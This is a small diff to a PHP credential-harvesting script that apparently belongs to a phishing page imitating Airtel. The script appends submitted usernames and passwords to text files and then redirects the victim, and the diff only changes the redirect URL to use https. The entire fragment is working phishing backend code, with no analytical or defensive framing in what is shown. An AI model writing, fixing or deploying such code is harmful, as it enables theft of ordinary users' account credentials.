@@ -4,5 +4,5 @@ file_put_contents("usernames.txt", "Airtel Username: " . $_POST['username']  . "
 ?>
 <?php
 file_put_contents("pass.txt", "Airtel Password : " . $pass = $_POST['password'] . "\n", FILE_APPEND);
-header('Location: redirecturl');
+header('Location: https://redirecturl');
 ?>
